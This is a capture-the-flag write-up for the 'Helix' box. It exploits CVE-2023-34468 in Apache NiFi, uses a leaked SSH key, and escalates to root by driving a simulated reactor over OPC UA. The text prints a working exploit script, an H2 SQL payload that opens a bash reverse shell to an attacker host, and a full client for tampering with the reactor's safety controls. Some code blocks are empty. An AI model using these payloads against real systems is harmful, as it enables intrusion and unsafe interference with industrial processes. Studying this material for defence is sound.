Apache NiFi 1.21.0 hosted on a `flow.helix.htb` subdomain with anonymous write access on its REST API is exploited via **CVE-2023-34468** — abusing the `DBCPConnectionPool` controller service to point at an H2 in-memory database whose JDBC URL contains `INIT=RUNSCRIPT FROM`, which causes H2 to fetch and execute a remote SQL file at connection-open time; the SQL file defines a `SHELLEXEC` alias backed by `Runtime.getRuntime().exec()` and immediately calls it to spawn a reverse shell as `nifi`. A forgotten SSH private key in `/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak` provides the lateral move to `operator`. Privilege escalation is the most involved stage: `operator` can only run `helix-maint-console` as root via sudo, but the binary refuses unless `/opt/helix/state/maintenance_window` (root-owned) contains a future Unix timestamp; that file is written by a root-running `helix-safety` daemon that monitors an industrial-reactor simulation exposed over OPC UA on `127.0.0.1:4840`. The reactor must be coaxed into a specific physical state — temperature in the 295-305°C window without tripping the safety interlock at ≥305°C — through careful ramping of a `CalibrationOffset` variable, with all the rules encoded in a password-protected operator's PDF whose password (`operator1`) is recovered with `pdf2john`. An `asyncua` Python client drives the OPC UA tunnel, brings the reactor into spec, `helix-safety` opens the window, and the maintenance console is invoked in time to land a root shell.

## Exploitation — CVE-2023-34468 (Apache NiFi H2 JDBC RCE)

### Understanding the vulnerability

Apache NiFi is a data-flow orchestration platform. The unit of work is a **flow**: a directed graph of components on a canvas, where two component types are relevant here:

- **`DBCPConnectionPool`** — a *controller service* that defines **how to connect to a database**, parameterised by a JDBC URL, a driver class name, and optionally a driver path on disk.
- **`ExecuteSQL`** — a *processor* that uses a `DBCPConnectionPool` to issue SQL statements.

The vulnerability is in the interaction between a user-controlled JDBC URL and the **H2** database engine. H2 is a pure-Java embedded database that NiFi ships in its classpath for its own internal use, which means an attacker who controls a JDBC URL can ask NiFi to connect to an H2 database without needing to supply the driver — NiFi will resolve `org.h2.Driver` from its own classpath.

What makes H2 a code-execution gadget rather than just a database is two features of its dialect:

1. **`CREATE ALIAS ... AS $$ ... $$`** — defines a SQL alias backed by an arbitrary Java method. The body between the `$$` markers is Java source compiled and registered at runtime. A method that calls `Runtime.getRuntime().exec(...)` becomes a SQL-callable RCE primitive.
2. **`INIT=` in the JDBC URL** — H2 reads an `INIT` parameter from the connection string and executes its contents as SQL **immediately when the connection is opened**, before any application-issued query.

Composed, the primitive is: control the JDBC URL → set `INIT=<sql that creates an alias and calls it>` → wait for NiFi to open the connection → arbitrary code runs in NiFi's JVM.

### The RUNSCRIPT variant

The most-cited public PoC (originally by Jeanpt at `github.com/Jeanpt/CVE-2023-34468`) embeds the malicious SQL directly inside the JDBC URL, using `CREATE TRIGGER` with a JavaScript body. That approach has two drawbacks: the URL becomes long and brittle (escaping rules differ between NiFi's REST API and H2's URL parser), and it depends on the specific H2 build supporting JavaScript triggers.

H2 supports a cleaner gadget: **`RUNSCRIPT FROM '<url>'`** instructs H2 to fetch and execute a SQL file from a remote URL. Used as the value of `INIT`, this externalises the payload entirely — the URL only references the staging server, and the SQL file can be edited freely without re-encoding for URL transport.

The modified exploit script implements this RUNSCRIPT variant. The critical method is the one that builds the JDBC URL and registers the controller service:

```python
def create_dbcp_service(self, pg_id):
    db_name = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))

    # H2 in-memory; al abrir la conexion ejecuta RUNSCRIPT, que descarga
    # rce.sql desde tu servidor HTTP y corre el payload (CREATE ALIAS + CALL).
    h2_url = (
        f"jdbc:h2:mem:{db_name};DB_CLOSE_DELAY=-1;"
        f"INIT=RUNSCRIPT FROM 'http://{self.lhost}:{self.http_port}/rce.sql'"
    )

    body = {
        "revision": {"version": 0},
        "component": {
            "type": "org.apache.nifi.dbcp.DBCPConnectionPool",
            "name": f"ExploitDBCP_{db_name}",
            "properties": {
                "Database Connection URL": h2_url,
                "Database Driver Class Name": "org.h2.Driver",
                # SIN database-driver-locations: se resuelve del classpath
                "Max Total Connections": "1"
            }
        }
    }

    resp = self.session.post(
        f"{self.target}/nifi-api/process-groups/{pg_id}/controller-services",
        json=body, headers=self._headers(), timeout=10
    )
    # ... (handle response, return service_id + revision)
```

Two implementation details are worth highlighting. First, the JDBC URL uses `jdbc:h2:mem:` (in-memory database, no on-disk footprint) with a random `db_name` — this avoids leaving artefacts and prevents accidental reuse if a previous exploitation attempt left state behind. Second, and more importantly, the request body **does not include `database-driver-locations`**. The first version of the script I tried did include it (pointing at a non-existent path) and the controller service stuck in `INVALID` state with a validation error. Omitting the field lets NiFi resolve `org.h2.Driver` from its own classpath, where it already exists.

The full exploitation flow orchestrates six API calls in order:

```python
def exploit(self):
    # Step 1: discover the root process group ID (needed for subsequent calls)
    pg_id = self.get_root_pg()

    # Step 2: create the malicious DBCP service with the H2/RUNSCRIPT URL
    self.service_id, service_rev = self.create_dbcp_service(pg_id)

    # Step 3: create an ExecuteSQL processor (the consumer of the DBCP service)
    self.processor_id = self.create_processor(pg_id)

    # Step 4: configure the processor to point at the malicious service
    self.configure_processor(self.processor_id, self.service_id)

    # Step 5: enable the DBCP service (still no SQL issued yet — H2 connection
    #         is lazy until something actually executes a query)
    self.enable_dbcp_service(self.service_id, service_rev)

    # Step 5b: wait until the service reports ENABLED (validation == VALID).
    #          if it stays INVALID the driver path / URL is wrong.
    self.wait_until_enabled(self.service_id)

    # Step 6: start the ExecuteSQL processor. This issues a "SELECT H2VERSION()
    #         FROM DUAL" against the DBCP service, which opens the H2 connection,
    #         which fires INIT, which runs RUNSCRIPT, which fetches and executes
    #         rce.sql. RCE triggers here.
    self.start_processor(self.processor_id)
```

The remaining methods of the class — `supports_login`, `authenticate`, `_get_revision`, `do_cleanup` — handle the cases where NiFi requires authentication (it doesn't on this box) and clean up the artefacts after the shell is caught (processors and controller services are reverted to their pre-exploit state if `--cleanup` is on, leaving the canvas pristine).

The `rce.sql` file served by the local HTTP server is small enough to include in full:

```sql
CREATE ALIAS IF NOT EXISTS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1');
```

The first statement defines `SHELLEXEC` as a Java method that wraps `Runtime.getRuntime().exec(...)`. The `$$ ... $$` delimiters carry Java source through H2's parser. The second statement invokes the alias with a standard Bash reverse-shell one-liner.

The `nifi` user holds the application's runtime files but no shell-rich content of its own. Standard enumeration as `nifi` came up dry — no `sudo -l` entries, no SUID curiosities, no readable secrets in the home directory. The breakthrough came from a targeted file search across the filesystem:

## Privilege Escalation — `operator` → `root`

The privesc on this box is unusually involved and worth slowing down for: the path to root requires understanding a small Industrial Control System (ICS) simulation, satisfying physical-process constraints encoded in a separately-locked PDF, and driving the simulation through an **OPC UA** protocol that's only accessible via SSH tunnel. The bug isn't in any single component — it's in the *architectural* assumption that controlling a physical process can serve as access control. This section is split into the discovery, the constraint analysis, the procedure, and the final exploitation.

### Discovering the constraint

`sudo -l` returned exactly one entry:

```bash
sudo -l
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

A single root command. Inspecting the binary (with `file`, `strings`, and a glance at its behaviour) revealed that **it is not directly vulnerable** — there's no command injection, no library hijack, no PATH abuse. What the binary does is check a single file:

```bash
ls -la /opt/helix/state/
total 12
drwxr-xr-x 2 root root 4096 Jun 27 14:32 .
drwxr-xr-x 3 root root 4096 Jun 27 14:32 ..
-rw-r--r-- 1 root root    0 Jun 27 14:32 maintenance_window

cat /opt/helix/state/maintenance_window
(empty)
```

The binary reads `/opt/helix/state/maintenance_window`. If the file contains a future Unix timestamp, it spawns a root shell via `systemd-run` (so the shell is reparented out of the sudo session and has a clean PID 1 ancestry — a touch of operational hygiene). If the file is empty or contains a past timestamp, it prints `Maintenance window CLOSED` and exits. Trying it directly confirms the gate:

```bash
sudo /usr/local/sbin/helix-maint-console
[!] Maintenance window CLOSED. Try again when authorized.
```

The state directory is root-owned and `operator` cannot write to it. So *something else* writes that file — and finding the something else is the actual challenge.

### The Industrial Control System simulation

Local-only listening sockets and processes told the rest of the story:

```bash
ss -tlnp
LISTEN 0  4096  127.0.0.1:4840   0.0.0.0:*
LISTEN 0  511   127.0.0.1:8080   0.0.0.0:*
LISTEN 0  511   127.0.0.1:8081   0.0.0.0:*
```

```bash
ps -ef | grep -E "helix|plc"
root      1492  /usr/local/bin/helix-safety
helix     1493  /usr/local/bin/helix-plc
helix     1495  /usr/local/bin/helix-hmi --port 8080
helix     1496  /usr/local/bin/helix-hmi --port 8081
```

Three services run on loopback as part of a coherent simulation:

- **`helix-plc`** — the **Programmable Logic Controller**. Models the physical reactor: temperature, pressure, calibration offsets. Exposes its state via **OPC UA** on `127.0.0.1:4840`. This is the standard industrial automation protocol — most real-world PLCs from Siemens, Beckhoff, Rockwell expose it.
- **`helix-hmi`** — the **Human-Machine Interface**. Web dashboards on `127.0.0.1:8080/8081`. The HMI is the operator-facing view of what the PLC is doing.
- **`helix-safety`** — the **safety interlock daemon**, **running as root**. Watches the PLC's state via OPC UA, enforces interlock rules, and — critically — **writes `/opt/helix/state/maintenance_window`** when the reactor reaches a particular physical state.

The architecture is now visible: `helix-safety` is the only process with write access to the gating file. Its decision to open the maintenance window is conditioned on the *physical state of the simulated reactor*. To get root, the attacker needs to drive the reactor into a specific state, persuade `helix-safety` to write a future timestamp into the file, and then run `helix-maint-console` before the window closes.

The PLC variables required to do this are accessible — but only via OPC UA, and only from localhost.

### Cracking the Operator Guide PDF

Sitting in `operator`'s home directory is a password-protected document:

```bash

```

```bash

```

The PDF is the manual the operator role would actually use; it contains the rules the PLC enforces and the procedures the safety daemon expects. Without those rules, the privesc devolves into blindly poking PLC variables and waiting for safety trips. Recovering the password with the standard `john` workflow:

```bash

operator1        (Operator Control & Safety Guide.pdf)
```

Password `operator1`. Opening the PDF with that password reveals the manual.

### The PLC's rules — what the manual says

The relevant content of the safety guide distils to five rules. These are the only material constraints; the rest of the document is operational filler.

1. **Trip thresholds** (section 4): the safety interlock trips when **Temperature ≥ ~305 °C** *or* **Pressure ≥ ~75 bar**. A trip latches the system into a fail-safe state until explicitly reset.

2. **Maintenance window opening condition** (section 7): the window opens when **Temperature is at ~295 °C** (or Pressure at ~73 bar), with the system **below the trip thresholds** and **no trip currently active**. In practice this means a **safe band of 295-305 °C** with `TripActive = False`.

3. **CalibrationOffset is the only operator-adjustable input** (sections 3 and 6): adjusting `CalibrationOffset` introduces a bias that adds to `TemperatureRaw` to produce the reported `Temperature`. **The PLC only applies the offset when `Mode = MAINTENANCE` and `TestOverride = True`** — in `NORMAL` mode the offset is ignored. This is the protection that the manual assumes will prevent accidental drift.

4. **Trip reset is conditional** (section 5): a trip can only be reset if **all of** the following hold simultaneously: `Temperature < ~288`, `Pressure < ~70`, `Mode = NORMAL`, `TestOverride = False`, `CalibrationOffset = 0.0`. Any one of these out of compliance and the reset is refused.

5. **Offset changes must be gradual** (section 8): a step change in `CalibrationOffset` that pushes the temperature across a trip threshold will fire the interlock immediately. The PLC's safety model assumes physical heat exchange takes time; the manual's intent is for the operator to dial in changes slowly. Ramping is mandatory.

The exploitation procedure follows directly. To open the maintenance window, the offset has to be raised until reported `Temperature` lands in 295-305, but raised slowly enough not to cross 305 (which would trip the interlock), starting from a clean state (so the rules don't refuse the operations). The PLC's `Mode` and `TestOverride` flags have to be set so the offset is actually applied, but the trip reset (which requires `Mode = NORMAL` and `TestOverride = False`) has to happen first.

### Tunneling OPC UA over SSH

The OPC UA endpoint listens on `127.0.0.1:4840` and is not reachable from the attacker box. The standard fix is an SSH local port forward — `-L` binds a local port on the attacker side and tunnels it through the SSH session to the specified host/port from the target's perspective:

```bash
ssh -i operator_id_ed25519 -L 4840:127.0.0.1:4840 operator@helix.htb -N
```

The `-N` flag tells SSH to forward only, without running a remote command — useful for keeping a tunnel alive without an interactive session occupying the terminal. After the tunnel is up, `opc.tcp://localhost:4840` on the attacker box reaches the PLC.

### The `asyncua` client

The `asyncua` library is the Python client for OPC UA. The script below implements the three-phase procedure derived from the manual. It's written as a single file with one async function per phase and a hardcoded mapping of variable names to OPC UA NodeIds. The NodeIds were discovered by walking the address space with an OPC UA browser (uaexpert, or `asyncua`'s own object hierarchy) on a first reconnaissance pass — they're hardcoded here for clarity.

```python
#!/usr/bin/env python3
"""
Helix OPC UA - solucion DEFINITIVA (siguiendo el Operator Guide al pie de la letra).

Reglas del PLC (del PDF):
  - En NORMAL mode el CalibrationOffset se IGNORA. Para que tenga efecto:
        Mode = MAINTENANCE  Y  TestOverride = True   (seccion 3 y 6)
  - Trip: Temperatura >= ~305  o  Presion >= ~75       (seccion 4)
  - Ventana de mantenimiento: Temperatura ~= 295  (o Presion ~= 73)
        manteniendose por debajo de los trips, sin trip activo  (seccion 7)
  - El trip SOLO se resetea si TODO esto a la vez (seccion 5):
        Temp < ~288, Presion < ~70, Mode = NORMAL,
        TestOverride = False, CalibrationOffset = 0.0
  - Hay que SUBIR EL OFFSET DESPACIO (rampa). Si se sube de golpe, trip. (seccion 8)
"""

import sys
import asyncio
from asyncua import Client

URL = sys.argv[1] if len(sys.argv) > 1 else "opc.tcp://localhost:4840"
TARGET = float(sys.argv[2]) if len(sys.argv) > 2 else 297.0  # dentro de 295-305

N = {
    "Mode":             "ns=2;i=12",
    "ResetTrip":        "ns=2;i=14",
    "TestOverride":     "ns=2;i=13",
    "CalibrationOffset":"ns=2;i=6",
    "Pressure":         "ns=2;i=5",
    "Temperature":      "ns=2;i=4",
    "TemperatureRaw":   "ns=2;i=3",
    "TripActive":       "ns=2;i=10",
}


async def rd(c, n):
    return await c.get_node(N[n]).read_value()


async def wr(c, n, v):
    await c.get_node(N[n]).write_value(v)


async def show(c, title):
    print(f"\n--- {title} ---")
    for k in ("Mode", "TemperatureRaw", "Temperature", "CalibrationOffset",
              "Pressure", "TestOverride", "TripActive"):
        print(f"    {k:18}= {await rd(c, k)}")


async def safe_reset(c):
    """Lleva el reactor a estado seguro segun seccion 5 y resetea el trip."""
    print("\n[*] FASE 1: estado seguro + reset del trip (seccion 5)")
    await wr(c, "Mode", "NORMAL")
    await wr(c, "TestOverride", False)
    await wr(c, "CalibrationOffset", 0.0)
    await asyncio.sleep(0.6)
    for i in range(8):
        t = await rd(c, "Temperature")
        p = await rd(c, "Pressure")
        trip = await rd(c, "TripActive")
        print(f"    intento {i+1}: Temp={t:.1f} Pres={p:.1f} Trip={trip}")
        if trip is False:
            print("    [+] Trip limpio (o no estaba activo).")
            return True
        if t < 288 and p < 70:
            await wr(c, "ResetTrip", True)
        await asyncio.sleep(0.8)
    return await rd(c, "TripActive") is False


async def enter_maintenance(c):
    """Seccion 6: Mode=MAINTENANCE + TestOverride=True para que el offset surta efecto."""
    print("\n[*] FASE 2: entrar en modo mantenimiento (seccion 6)")
    await wr(c, "Mode", "MAINTENANCE")
    await wr(c, "TestOverride", True)
    await asyncio.sleep(0.5)


async def ramp_offset(c, target):
    """Seccion 8: subir el offset DESPACIO hasta llegar a target sin disparar trip."""
    print(f"\n[*] FASE 3: rampa suave del offset hasta Temp ~= {target} (seccion 8)")
    raw = await rd(c, "TemperatureRaw")
    needed = target - raw
    print(f"    TemperatureRaw={raw:.1f}, offset necesario ~= {needed:.1f}")
    step = 1.0
    applied = 0.0
    while applied < needed:
        applied = min(applied + step, needed)
        await wr(c, "CalibrationOffset", float(applied))
        await asyncio.sleep(0.4)
        t = await rd(c, "Temperature")
        trip = await rd(c, "TripActive")
        print(f"    offset={applied:5.1f}  Temp={t:6.2f}  Trip={trip}")
        if trip is True:
            print("    [-] Trip disparado durante la rampa.")
            return False
    return True


async def main():
    print(f"[*] Conectando a {URL}")
    print(f"[*] Objetivo de temperatura: {TARGET} (franja 295-305)")
    async with Client(URL) as c:
        await show(c, "ESTADO INICIAL")
        if not await safe_reset(c):
            print("\n[-] No se pudo limpiar el trip.")
            return
        await enter_maintenance(c)
        if not await ramp_offset(c, TARGET):
            print("\n[-] La rampa disparo el trip.")
            return
        await show(c, "ESTADO LISTO")
        print("\n[!] >>> AHORA, en tu SSH de operator:")
        print("        sudo /usr/local/sbin/helix-maint-console")
        print("\n[*] Mantengo el estado 40s.")
        for i in range(40, 0, -5):
            t = await rd(c, "Temperature")
            trip = await rd(c, "TripActive")
            print(f"    quedan {i:2d}s | Temp={t:.1f} | Trip={trip}")
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(main())
```

Three things in the script deserve highlighting beyond the in-line comments.

**Phase 1 is the gate that lets every later step succeed.** The reactor might be in any state when the script runs — possibly with a previous attacker's trip latched, or with the offset already non-zero. `safe_reset` brings everything back to the canonical safe state (`Mode=NORMAL`, `TestOverride=False`, `CalibrationOffset=0.0`), then attempts the trip reset up to eight times, only issuing the reset when the manual's conditions (`Temperature<288`, `Pressure<70`) hold. The PLC will refuse the reset otherwise, and an unreset trip blocks every subsequent step.

**Phase 2 is the smallest possible step but easy to forget.** Setting `Mode=MAINTENANCE` and `TestOverride=True` is what unlocks the `CalibrationOffset` from being silently ignored. The HMI dashboards on 8080/8081 do *not* expose these flags — they're maintenance-engineer territory and only reachable via OPC UA. A novice running the offset manipulation without first entering maintenance mode would see the offset variable update but `Temperature` would never change.

**Phase 3 is where the timing actually matters.** The ramp uses a step of 1.0 and an inter-step sleep of 0.4 seconds. Setting the offset to the final value directly would compute a delta of ~15 (`297 - 282 = 15` is typical for the initial raw temperature) and `helix-safety` would fire the trip the moment Temperature crossed 305 — even if the final target is 297. The PLC's safety model is a strict inequality and a momentary excursion is enough. The trailing 40-second monitoring loop after the ramp keeps the reactor in the band long enough for the operator to run the console in a separate SSH session.

`helix-safety` detects the in-band state and writes a future timestamp to the gating file. Verification on the operator session:

```bash
cat /opt/helix/state/maintenance_window
1782730145
```

Then, in the same operator session, the moment that timestamp shows up:

```bash
sudo /usr/local/sbin/helix-maint-console
[+] Maintenance window OPEN until 2026-06-29 12:09:05 UTC.
[+] Spawning maintenance shell as root via systemd-run...
root@helix:~# whoami
root
root@helix:~# cat /root/root.txt
```

The `systemd-run` re-parenting is a defensive measure on the binary's part — it ensures the spawned shell is a child of systemd rather than of the sudo session, which means closing the sudo session won't kill the root shell. From the attacker's perspective it's transparent; the shell is root either way.

## Key Takeaways

- **Anonymous write access to NiFi is total compromise, regardless of patch level.** CVE-2023-34468 is widely understood as a vulnerability of NiFi versions ≤1.21.0, but the *exploitability* of the bug depends entirely on whether an attacker can create or modify controller services. A patched NiFi with permissive policies is dangerous in different ways (different gadgets, different controllers), and an unpatched NiFi with locked-down policies is largely safe. Apache's own guidance on NiFi hardening — restrict the anonymous user, enable authentication, configure user authorities — is the actual mitigation. Patching is secondary.
- **JDBC URLs are user input.** Most developers writing JDBC code think of the URL as configuration, not as something an attacker controls. When a system lets users — even authenticated administrators — specify a JDBC URL, every parameter the driver supports becomes part of the attack surface, including the obscure ones like H2's `INIT`, MS SQL's `loadBalanceFile`, or Oracle's `OracleClient` properties. The fix at the application layer is to validate the URL aggressively (allowlist hosts, deny parameters with side effects); the fix at the driver layer is what H2 ≥2.1.214 implements — refusing `INIT=` from network URLs entirely.
- **`RUNSCRIPT FROM '<url>'` is the externalisation that makes URL-embedded payloads cleaner.** Whenever a server-side gadget supports including a remote payload by URL, prefer that to inlining the payload in a parameter. Inline payloads are subject to whatever escaping rules the URL parser, the application, the framework, and the database itself impose; externalised payloads bypass all of that with a single HTTP fetch. The same lesson recurs in `wget` parameters, `LOAD DATA INFILE`, XSL Transformations, XXE, JNDI, and anywhere else where a single string parameter can transport a URL.
- **`.bak` files in `support-bundles` directories are the digital version of a sticky note under a keyboard.** Forgotten backups are one of the most reliable lateral-movement primitives in real engagements, not just CTFs. Every operator who has ever run `cp config.yaml config.yaml.bak` before touching the original has created exactly this artefact, and they almost never get cleaned up. A reflexive `find / -name "*.bak" -o -name "*.old" -o -name "*~" 2>/dev/null` after every foothold pays off across many engagements.
- **Physical-process state is not access control.** The Helix box turns this into an explicit lesson by making the *maintenance window file* the only thing standing between a normal user and a root shell. The lesson generalises far beyond this CTF: anywhere a privileged operation is gated by a condition that can be influenced from a less-privileged context — sensor readings in an industrial control system, system load thresholds, time-of-day windows, business-hour checks — the gate is breakable in proportion to how much of the influencing surface the attacker can reach. The fix is to anchor authorisation in cryptographically-verifiable identity, not in environmental state.
- **OPC UA on localhost is internet-adjacent the moment an SSH foothold exists.** Industrial control system protocols (OPC UA, Modbus, S7Comm, EtherNet/IP) were designed for trusted networks where every node is operationally critical. The conventional defence is segmentation: keep the ICS network physically separated, isolate engineering workstations, restrict who can reach the protocol. When any of those defences fails — including the case where the ICS endpoint lives on the same Linux host as a vulnerable web application — every safety, configuration, and operational primitive of the protocol becomes attacker-accessible.
- **Documentation is part of the attack surface.** The operator's PDF in this engagement contains the specific information needed to choreograph the privesc: the safe ranges, the activation conditions for `CalibrationOffset`, the trip-reset preconditions. Without it the attacker would have to reverse-engineer those rules from PLC behaviour. Manuals, runbooks, and architecture diagrams are routinely the highest-value artefacts in a compromised file share — they contain the institutional knowledge that turns hours of trial-and-error into single-shot operations. Password-protecting the PDF imposes only the cost of a `pdf2john` + rockyou run.
- **`systemd-run` as a root-shell-spawning primitive is operationally tidy but does not enhance security.** The Helix maintenance console reparents the root shell out of the sudo session via `systemd-run`, which makes the shell survive an operator logout and look cleaner in process listings. From a hardening perspective this is irrelevant: a root shell is a root shell regardless of its parent process. Defenders should not interpret `systemd-run` in audit logs as benign; in this engagement it's the literal mechanism of privilege escalation.
